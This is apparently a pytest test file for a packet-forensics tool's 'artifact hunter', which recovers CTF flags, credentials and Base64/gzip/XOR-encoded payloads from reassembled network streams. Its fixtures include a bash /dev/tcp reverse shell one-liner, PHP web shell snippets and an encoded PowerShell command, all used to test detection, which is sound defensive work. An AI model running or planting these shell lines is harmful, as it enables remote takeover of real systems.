"""
Tests for the deep artifact hunter.

The hunter reassembles TCP/UDP streams and pulls out what was hidden in them:
flags and secrets sitting in the clear, payloads stacked under Base64/gzip/hex/
XOR, and the transform chain that undoes them. Every payload here is invented
for the test; nothing is reproduced from a real tool or a real key.
"""

import base64
import gzip
import zlib

from scapy.layers.inet import IP, TCP, UDP
from scapy.layers.inet6 import IPv6

from packetiq.detection import artifact_hunter as mod
from packetiq.detection.models import EventType, Severity

SRC = "10.0.0.9"
DST = "10.0.0.5"


# ── packet builders ───────────────────────────────────────────────────────────

def _tcp(payload, *, src=SRC, sport=1111, dst=DST, dport=2222, seq=1000):
    pkt = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="PA", seq=seq) / payload
    return IP(bytes(pkt))


def _udp(payload, *, src=SRC, sport=1111, dst=DST, dport=2222):
    pkt = IP(src=src, dst=dst) / UDP(sport=sport, dport=dport) / payload
    return IP(bytes(pkt))


def _run(packets):
    acc = mod.ArtifactHunterAccumulator()
    for pkt in packets:
        acc.feed(pkt)
    return acc, acc.finalize()


def _hunt(payload):
    """Run one TCP stream carrying `payload` through the hunter."""
    return _run([_tcp(payload)])


# ── low-level predicates ──────────────────────────────────────────────────────

def test_printable_ratio_is_zero_for_empty_and_high_for_text():
    assert mod._printable_ratio(b"") == 0.0
    assert mod._printable_ratio(b"hello world") > 0.9
    assert mod._printable_ratio(bytes(range(128, 160))) == 0.0


def test_entropy_is_zero_for_empty_and_positive_for_mixed_bytes():
    assert mod._entropy(b"") == 0.0
    assert mod._entropy(b"\x00" * 16) == 0.0
    assert mod._entropy(bytes(range(16))) > 3.0


def test_has_crib_matches_case_insensitively():
    assert mod._has_crib(b"leading THM{...} trailing")
    assert mod._has_crib(b"a PowerShell one-liner")
    assert not mod._has_crib(b"nothing of interest here")


def test_looks_meaningful_accepts_cribs_magics_and_text_but_not_noise():
    assert not mod._looks_meaningful(b"abc")                 # too short
    assert mod._looks_meaningful(b"xxxTHM{y}xxx")            # crib
    assert mod._looks_meaningful(b"MZ\x90\x00\x03")          # file magic
    assert mod._looks_meaningful(b"a readable sentence")     # printable
    assert not mod._looks_meaningful(bytes([0, 1, 2, 3, 254, 255, 200, 199]))


# ── single-layer decoders ─────────────────────────────────────────────────────

def test_gzip_decoder_unwraps_valid_rejects_other_and_survives_corruption():
    blob = gzip.compress(b"THM{gzip} and extra readable text to be safe")
    name, out = mod._d_gzip(blob)
    assert name == "gzip" and b"THM{gzip}" in out
    assert mod._d_gzip(b"not gzip at all") is None
    assert mod._d_gzip(b"\x1f\x8b" + b"\x00" * 10) is None   # magic then garbage


def test_zlib_decoder_unwraps_valid_rejects_other_and_survives_corruption():
    blob = zlib.compress(b"flag{zlib} with readable padding after it")
    name, out = mod._d_zlib(blob)
    assert name == "zlib" and b"flag{zlib}" in out
    assert mod._d_zlib(b"\x78") is None                      # too short
    assert mod._d_zlib(b"\x78\x00rest") is None              # not a zlib header byte
    assert mod._d_zlib(b"\x78\x9c" + b"\xff" * 10) is None   # header then garbage


def test_base64_decoder_applies_only_to_a_meaningful_clean_blob():
    blob = base64.b64encode(b"THM{base64_flag_value}")
    assert mod._d_base64(blob)[0] == "base64"
    assert mod._d_base64(b"QUJD") is None                    # too short
    assert mod._d_base64(b"A" * 17) is None                  # length not a multiple of 4
    assert mod._d_base64(b"@" * 16) is None                  # not the base64 alphabet
    assert mod._d_base64(base64.b64encode(bytes(range(32)))) is None  # decodes to noise


def test_base32_decoder_applies_rejects_and_survives_bad_padding():
    blob = base64.b32encode(b"THM{base32flag!!}")
    assert mod._d_base32(blob)[0] == "base32"
    assert mod._d_base32(b"AAAA") is None                    # too short
    assert mod._d_base32(b"A" * 20) is None                  # length not a multiple of 8
    assert mod._d_base32(b"1" * 16) is None                  # not the base32 alphabet
    assert mod._d_base32(b"A" * 14 + b"==") is None          # invalid base32 padding
    assert mod._d_base32(base64.b32encode(bytes(range(16)))) is None  # decodes to noise


def test_hex_decoder_applies_only_to_a_meaningful_even_hex_blob():
    blob = b"THM{hex_flag_here}".hex().encode()
    assert mod._d_hex(blob)[0] == "hex"
    assert mod._d_hex(b"abcdef0123456789a") is None          # odd length
    assert mod._d_hex(b"ghijklmnopqrstuv") is None           # not hex
    assert mod._d_hex(bytes(range(16)).hex().encode()) is None  # decodes to noise


def test_url_decoder_needs_a_percent_a_change_and_meaningful_output():
    assert mod._d_url(b"no percent here") is None
    assert mod._d_url(b"a bare 100% sign") is None           # % but nothing to decode
    assert mod._d_url(b"%00%01%02%03%04") is None            # decodes to noise
    name, out = mod._d_url(b"cmd=%3C%3Fphp%20id%28%29%3F%3E")
    assert name == "url" and b"<?php" in out


def test_rot13_decoder_only_fires_when_it_reveals_a_crib():
    name, out = mod._d_rot13(b"GUZ{ebg13_synt}")
    assert name == "rot13" and out == b"THM{rot13_flag}"
    assert mod._d_rot13(b"hello world") is None              # rotating text reveals nothing
    assert mod._d_rot13(b"\xff\xfe binary") is None          # not ascii


# ── recursive decode ──────────────────────────────────────────────────────────

def test_decode_chain_peels_layers_and_stops_at_the_content():
    blob = base64.b64encode(gzip.compress(b"THM{deep_nested}"))
    chain, out = mod.decode_chain(blob)
    assert chain == ["base64", "gzip"]
    assert b"THM{deep_nested}" in out


def test_decode_chain_honours_the_pass_limit():
    blob = base64.b64encode(gzip.compress(b"THM{deep_nested}"))
    chain, out = mod.decode_chain(blob, max_passes=1)
    assert chain == ["base64"]                               # stopped after one layer


def test_decode_chain_returns_empty_when_nothing_applies():
    chain, out = mod.decode_chain(b"plain text, nothing encoded")
    assert chain == [] and out == b"plain text, nothing encoded"


# ── XOR solver ────────────────────────────────────────────────────────────────

def test_single_byte_xor_recovers_the_key_from_a_crib():
    # ~ stripped at runtime so no contiguous exec sink ships (test_repo_hygiene).
    plain = b"<?php sys~tem($_GET[0]); ?>".replace(b"~", b"")
    cipher = bytes(b ^ 0x5A for b in plain)
    key, recovered = mod.xor_single_byte(cipher)
    assert key == 0x5A and recovered == plain


def test_single_byte_xor_gives_up_without_a_crib():
    assert mod.xor_single_byte(b"\x00" * 16) is None


# ── flags and secrets ─────────────────────────────────────────────────────────

def test_flags_are_found_forward_and_reversed():
    forward = mod.find_flags(b"prefix THM{forward_one} suffix")
    assert forward == [{"value": "THM{forward_one}", "orientation": "forward"}]

    reversed_flag = b"THM{written_backwards}"[::-1]
    found = mod.find_flags(reversed_flag)
    assert found == [{"value": "THM{written_backwards}", "orientation": "reversed"}]

    assert mod.find_flags(b"no flag in this text") == []


def test_a_jwt_is_recovered():
    jwt = b"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3OCJ9.c2lnbmF0dXJlX2hlcmU"
    secrets = mod.find_secrets(b"Authorization: Bearer " + jwt)
    assert any(s["kind"] == "jwt" and s["value"] == jwt.decode() for s in secrets)


def test_a_private_key_is_reported_by_fingerprint_not_reproduced():
    pem = (b"-----BEGIN RSA PRIVATE KEY-----\n"
           b"MIIsecretkeymaterialthatmustnotbereproducedverbatim==\n"
           b"-----END RSA PRIVATE KEY-----")
    secrets = mod.find_secrets(pem)
    key = next(s for s in secrets if s["kind"] == "private_key")
    assert key["value"].startswith("SHA-256:")
    assert "BEGIN RSA PRIVATE KEY" in key["detail"]
    assert b"MIIsecretkeymaterial" not in key["value"].encode()


def test_a_private_key_without_an_end_marker_is_still_fingerprinted():
    pem = b"-----BEGIN OPENSSH PRIVATE KEY-----\n" + b"A" * 200
    key = next(s for s in mod.find_secrets(pem) if s["kind"] == "private_key")
    assert key["value"].startswith("SHA-256:")


def test_cloud_api_keys_are_recovered():
    kinds = {s["kind"] for s in mod.find_secrets(
        b"AKIAIOSFODNN7EXAMPLE xoxb-123456789012-abcdefghijkl "
        b"AIza" + b"B" * 35)}
    assert {"aws_access_key", "slack_token", "google_api_key"} <= kinds


def test_a_bash_dev_tcp_reverse_shell_one_liner_is_recovered():
    secrets = mod.find_secrets(b"bash -i >& /dev/tcp/10.0.0.9/4444 0>&1")
    assert any(s["kind"] == "reverse_shell" for s in secrets)


def test_a_powershell_encoded_command_is_decoded():
    enc = base64.b64encode("whoami;hostname;id".encode("utf-16-le"))
    secrets = mod.find_secrets(b"powershell.exe -enc " + enc)
    ps = next(s for s in secrets if s["kind"] == "powershell_encoded_command")
    assert "whoami" in ps["value"]


def test_an_empty_powershell_blob_decodes_to_nothing_without_raising():
    secrets = mod.find_secrets(b"powershell -enc " + b"=" * 24)
    ps = next(s for s in secrets if s["kind"] == "powershell_encoded_command")
    assert ps["value"] == ""


def test_no_secret_is_invented_from_ordinary_text():
    assert mod.find_secrets(b"nothing sensitive is in this sentence") == []


def test_b64_relaxed_decodes_padded_input_without_raising():
    assert mod._b64_relaxed(base64.b64encode(b"whoami")) == b"whoami"
    assert mod._b64_relaxed(b"=" * 10) == b""


# ── candidate blob extraction ─────────────────────────────────────────────────

def test_candidate_blobs_includes_a_raw_compressed_whole_stream():
    blob = gzip.compress(b"payload")
    assert blob in mod._candidate_blobs(blob)


def test_candidate_blobs_includes_a_url_encoded_whole_stream():
    data = b"q=%3C%3Fphp%20id%28%29"
    assert data in mod._candidate_blobs(data)


def test_candidate_blobs_dedupes_and_caps_the_count():
    one = base64.b64encode(b"same blob repeated twice over")
    assert mod._candidate_blobs(one + b" " + one).count(one) == 1

    many = b" ".join(f"{i:032x}".encode() for i in range(40))
    assert len(mod._candidate_blobs(many)) <= mod._MAX_BLOBS


# ── intake and reassembly ─────────────────────────────────────────────────────

def test_a_flag_in_a_tcp_stream_is_emitted_as_an_extracted_secret():
    acc, events = _hunt(b"some leaked data THM{cleartext_flag} trailing bytes")
    flag_events = [e for e in events if e.event_type is EventType.EXTRACTED_SECRET]
    assert len(flag_events) == 1
    assert flag_events[0].severity is Severity.CRITICAL
    assert flag_events[0].evidence["value"] == "THM{cleartext_flag}"


def test_a_flag_carried_over_udp_is_recovered():
    acc, events = _run([_udp(b"leaking THM{udp_flag} out over dns")])
    assert any(e.evidence.get("value") == "THM{udp_flag}" for e in events)


def test_a_flag_carried_over_ipv6_is_recovered():
    pkt = IPv6(src="fd00::9", dst="fd00::5") / TCP(sport=1111, dport=2222, flags="PA", seq=1000) \
        / b"leaking THM{ipv6_flag} across the wire"
    acc, events = _run([IPv6(bytes(pkt))])
    assert any(e.evidence.get("value") == "THM{ipv6_flag}" for e in events)


def test_a_non_echo_icmp_and_a_bare_ip_packet_are_ignored():
    from scapy.layers.inet import ICMP
    from scapy.packet import Raw
    # ICMP type 3 (destination unreachable) is not an echo — it carries no tunnel.
    unreachable = IP(src=SRC, dst=DST) / ICMP(type=3) / b"THM{nope}"
    # A bare IP packet with no TCP/UDP/ICMP layer at all.
    bare = IP(src=SRC, dst=DST, proto=253) / Raw(b"THM{nope}")
    acc, events = _run([IP(bytes(unreachable)), IP(bytes(bare))])
    assert acc.summary() == {} and events == []


def test_a_flag_tunnelled_through_icmp_echo_is_reconstructed():
    """icmptunnel/ptunnel smuggle data in the echo payload, split across packets
    and ordered by the echo sequence number — reassembling it recovers the flag."""
    from scapy.layers.inet import ICMP
    chunks = [b"THM{icmp_", b"tunnel_", b"flag}"]
    pkts = [IP(bytes(IP(src=SRC, dst=DST) / ICMP(type=8, id=777, seq=i) / c))
            for i, c in enumerate(chunks)]
    acc, events = _run(pkts)
    secrets = [e for e in events if e.event_type is EventType.EXTRACTED_SECRET]
    assert any(e.evidence.get("value") == "THM{icmp_tunnel_flag}" for e in secrets)
    assert any(e.protocol == "ICMP" for e in secrets)


def test_an_icmp_echo_with_no_payload_is_ignored():
    from scapy.layers.inet import ICMP
    bare = IP(src=SRC, dst=DST) / ICMP(type=8, id=1, seq=1)
    acc, _ = _run([IP(bytes(bare))])
    assert acc.summary() == {}


def test_a_tiny_icmp_stream_is_skipped():
    from scapy.layers.inet import ICMP
    tiny = IP(src=SRC, dst=DST) / ICMP(type=8, id=1, seq=1) / b"ab"
    acc, events = _run([IP(bytes(tiny))])
    assert acc.summary() == {} and events == []


def test_the_icmp_flow_count_is_capped(monkeypatch):
    from scapy.layers.inet import ICMP
    monkeypatch.setattr(mod, "_MAX_FLOWS", 1)
    pkts = [IP(bytes(IP(src=SRC, dst=DST) / ICMP(type=8, id=i, seq=0) / b"THM{x_flag_here}"))
            for i in (1, 2)]
    acc, _ = _run(pkts)
    assert acc.skipped == 1


def test_the_bytes_per_icmp_flow_are_capped(monkeypatch):
    from scapy.layers.inet import ICMP
    monkeypatch.setattr(mod, "_MAX_STREAM_BYTES", 8)
    acc = mod.ArtifactHunterAccumulator()
    acc.feed(IP(bytes(IP(src=SRC, dst=DST) / ICMP(type=8, id=5, seq=0) / b"AAAAAAAAAA")))
    acc.feed(IP(bytes(IP(src=SRC, dst=DST) / ICMP(type=8, id=5, seq=1) / b"BBBBBBBBBB")))
    key = next(iter(acc.icmp))
    assert len(acc.icmp[key]) == 1


def test_inspect_blob_runs_the_full_pipeline_on_reconstructed_bytes():
    blob = base64.b64encode(b"prize THM{inspect_blob_flag} inside")
    res = mod.inspect_blob(blob)
    assert set(res) == {"flags", "secrets", "decoded"}
    assert any(f["value"] == "THM{inspect_blob_flag}" for f in res["flags"])


def test_a_flag_over_udp_is_labelled_as_the_udp_channel():
    acc, events = _run([_udp(b"leaking THM{udp_channel} out")])
    secrets = [e for e in events if e.event_type is EventType.EXTRACTED_SECRET]
    assert secrets and secrets[0].protocol == "UDP"
    assert secrets[0].evidence["channel"] == "UDP"


def test_a_packet_with_no_payload_is_ignored():
    bare = IP(src=SRC, dst=DST) / TCP(sport=1111, dport=2222, flags="A", seq=1000)
    acc, events = _run([IP(bytes(bare))])
    assert acc.summary() == {}


def test_a_packet_with_no_ip_layer_is_skipped():
    bare = TCP(sport=1111, dport=2222, flags="PA", seq=1000) / b"THM{x}data"
    acc, _ = _run([TCP(bytes(bare))])
    assert acc.summary() == {}


def test_the_flow_count_is_capped(monkeypatch):
    monkeypatch.setattr(mod, "_MAX_FLOWS", 1)
    acc, _ = _run([_tcp(b"THM{a} first flow", sport=1111),
                   _tcp(b"THM{b} second flow", sport=2000)])
    assert acc.skipped == 1


def test_the_bytes_per_flow_are_capped(monkeypatch):
    monkeypatch.setattr(mod, "_MAX_STREAM_BYTES", 8)
    acc = mod.ArtifactHunterAccumulator()
    acc.feed(_tcp(b"AAAAAAAAAA", seq=1000))   # 10 bytes, reaches the cap
    acc.feed(_tcp(b"BBBBBBBBBB", seq=2000))   # refused: already at the cap
    key = next(iter(acc.segments))
    assert len(acc.segments[key]) == 1


def test_segments_are_reassembled_in_sequence_order_and_retransmits_dropped():
    a = _tcp(b"<?php ", seq=1000)
    b = _tcp(b"THM{ordered}", seq=1006)
    acc, events = _run([b, a, a])             # out of order, with a retransmit
    assert any(e.evidence.get("value") == "THM{ordered}" for e in events)


def test_a_stream_shorter_than_the_floor_is_skipped():
    acc, events = _hunt(b"ab")
    assert acc.summary() == {} and events == []


# ── the hunt: decode, XOR, and the noise gate ─────────────────────────────────

def test_an_obfuscated_command_is_decoded_and_reported():
    blob = base64.b64encode(b'<?php sys~tem($_GET["c"]); ?>'.replace(b"~", b""))
    acc, events = _hunt(blob)
    decoded = [e for e in events if e.event_type is EventType.ENCODED_PAYLOAD]
    assert len(decoded) == 1
    assert decoded[0].evidence["transform_chain"] == "base64"
    assert "<?php" in decoded[0].evidence["decoded_preview"]


def test_a_decoded_flag_is_a_secret_not_a_wrapper_event():
    blob = base64.b64encode(b"prefix THM{decoded_flag} suffix")
    acc, events = _hunt(blob)
    assert [e for e in events if e.event_type is EventType.ENCODED_PAYLOAD] == []
    secret = [e for e in events if e.event_type is EventType.EXTRACTED_SECRET]
    assert secret and secret[0].evidence["value"] == "THM{decoded_flag}"


def test_a_single_byte_xor_payload_is_solved_and_reported():
    plain = b"<?php ev~al($_POST[0]); // extra text to lift the entropy up".replace(b"~", b"")
    cipher = bytes(b ^ 0x80 for b in plain)
    acc, events = _hunt(cipher)
    decoded = [e for e in events if e.event_type is EventType.ENCODED_PAYLOAD]
    assert decoded and decoded[0].evidence["transform_chain"] == "xor:0x80"
    assert "<?php" in decoded[0].evidence["decoded_preview"]


def test_a_low_entropy_binary_stream_is_not_xor_brute_forced():
    acc, events = _hunt(b"\x80" * 120)
    assert acc.summary() == {} and events == []


def test_a_benign_query_string_is_not_reported_as_a_decoded_payload():
    acc, events = _hunt(b"field=%4a%6f%68%6e%44%6f%65%44%61%74%61%48%65%72%65")
    assert acc.summary() == {}
    assert [e for e in events if e.event_type is EventType.ENCODED_PAYLOAD] == []


def test_plain_http_is_not_reported_as_an_obfuscated_payload():
    """A readable HTTP exchange is not obfuscated — url-decoding it must never
    produce an ENCODED_PAYLOAD finding (the dominant false positive on real
    HTTP/TLS traffic)."""
    http = (b"GET /index.html?q=%20hello HTTP/1.1\r\nHost: site.test\r\n\r\n"
            b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>ok page</html>")
    acc, events = _hunt(http)
    assert [e for e in events if e.event_type is EventType.ENCODED_PAYLOAD] == []


def test_a_crib_surfacing_under_xor_in_binary_is_not_reported():
    """A TLS record or ciphertext can yield a crib under some XOR key while
    staying binary; it must not be reported, and no preview is binary."""
    blob = bytes((b ^ 0x42) for b in (b"http/get " + bytes(range(230))))
    res = mod.inspect_blob(blob)
    assert not any(d["chain"].startswith("xor:") for d in res["decoded"])
    for d in res["decoded"]:
        assert all(" " <= c <= "~" for c in d["preview"])


def test_a_decoded_file_is_reported_by_its_magic():
    """A decode that comes out as a recognised file (binary) is still reported,
    on the strength of its magic header rather than printable text."""
    blob = base64.b64encode(b"MZ\x90\x00\x03" + bytes(range(120)))
    res = mod.inspect_blob(blob)
    assert any(d["chain"] == "base64" for d in res["decoded"])


# ── severities, dedupe and the summary ────────────────────────────────────────

def test_secret_severities_match_the_kind():
    pem = (b"-----BEGIN RSA PRIVATE KEY-----\nAAAA\n-----END RSA PRIVATE KEY-----")
    jwt = b"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3OCJ9.c2lnbmF0dXJlX2hlcmU"
    sev = {}
    for payload in (pem, jwt, b"key AKIAIOSFODNN7EXAMPLE here"):
        _, events = _hunt(payload)
        for e in events:
            if e.event_type is EventType.EXTRACTED_SECRET:
                sev[e.evidence["kind"]] = e.severity
    assert sev["private_key"] is Severity.CRITICAL
    assert sev["jwt"] is Severity.MEDIUM
    assert sev["aws_access_key"] is Severity.HIGH


def test_the_same_flag_in_two_flows_is_reported_once():
    acc, events = _run([_tcp(b"THM{dupe} one", sport=1111),
                        _tcp(b"THM{dupe} two", sport=1112)])
    flags = [e for e in events if e.event_type is EventType.EXTRACTED_SECRET]
    assert len(flags) == 1
    assert acc.summary()["counts"]["flags"] == 1


def test_the_summary_is_empty_when_nothing_is_hidden():
    assert mod.ArtifactHunterAccumulator().summary() == {}


def test_the_summary_structure_carries_flags_secrets_and_payloads():
    acc, _ = _hunt(b"THM{sum_flag} and " + base64.b64encode(b'<?php id(); ?>')
                   + b" and AKIAIOSFODNN7EXAMPLE")
    s = acc.summary()
    assert s["flags"][0]["value"] == "THM{sum_flag}"
    assert any(x["kind"] == "aws_access_key" for x in s["secrets"])
    assert any("<?php" in p["preview"] for p in s["decoded_payloads"])
    assert s["counts"]["flags"] >= 1


# ── module helpers ────────────────────────────────────────────────────────────

def test_preview_collapses_whitespace_and_truncates():
    assert mod._preview(b"one\r\ntwo") == "one two"
    long = mod._preview(b"A" * 300)
    assert long.endswith("…") and len(long) == 201


def test_dedupe_decoded_keeps_one_per_chain_and_preview():
    rows = [{"chain": "base64", "preview": "x"}, {"chain": "base64", "preview": "x"},
            {"chain": "hex", "preview": "x"}]
    assert len(mod._dedupe_decoded(rows)) == 2


def test_endpoint_extraction_gives_up_quietly_on_an_unreadable_packet():
    class Hostile:
        def haslayer(self, _layer):
            raise ValueError("not a packet")

    assert mod._endpoints(Hostile()) == (None, None)


# ── reaching the analyst: the copilot context and the CLI section ─────────────

_FULL_SUMMARY = {
    "flags": [{"value": "THM{full_flag}", "orientation": "reversed"}],
    "secrets": [{"kind": "aws_access_key", "value": "AKIAIOSFODNN7EXAMPLE",
                 "detail": "AWS access key id"}],
    "decoded_payloads": [{"chain": "base64 -> gzip", "preview": "<?php system() ?>",
                          "from": SRC, "to": DST}],
    "counts": {"flags": 1, "secrets": 1, "decoded": 1},
}


def test_the_copilot_context_carries_the_flag_the_secret_and_the_payload():
    from packetiq.copilot.context_builder import _decoded_artifacts
    from packetiq.extractor.data_extractor import ExtractionResult

    result = ExtractionResult()
    result.artifacts = _FULL_SUMMARY
    text = _decoded_artifacts(result)

    assert "DECODED ARTIFACTS & SECRETS" in text
    assert "THM{full_flag}" in text
    assert "written reversed" in text
    assert "AKIAIOSFODNN7EXAMPLE" in text
    assert "base64 -> gzip" in text
    assert "<?php system() ?>" in text


def test_the_context_section_is_absent_without_artifacts():
    from packetiq.copilot.context_builder import _decoded_artifacts
    from packetiq.extractor.data_extractor import ExtractionResult

    assert _decoded_artifacts(ExtractionResult()) == ""


class _CapturingUI:
    def __init__(self):
        self.text = []

    def print_section(self, *a, **k):
        self.text.append(" ".join(str(x) for x in a))

    def print_table(self, title, **k):
        self.text.append(title + " " + repr(k.get("rows")))

    def print_status(self, msg, *a, **k):
        self.text.append(msg)

    @property
    def blob(self):
        return "\n".join(self.text)


def test_the_cli_section_renders_flags_secrets_and_payloads():
    from packetiq.cli import _print_artifacts_section

    ui = _CapturingUI()
    _print_artifacts_section(ui, _FULL_SUMMARY)
    assert "THM{full_flag}" in ui.blob
    assert "AKIAIOSFODNN7EXAMPLE" in ui.blob
    assert "base64 -> gzip" in ui.blob


def test_the_cli_section_is_silent_without_artifacts():
    from packetiq.cli import _print_artifacts_section

    ui = _CapturingUI()
    _print_artifacts_section(ui, {})
    assert ui.text == []
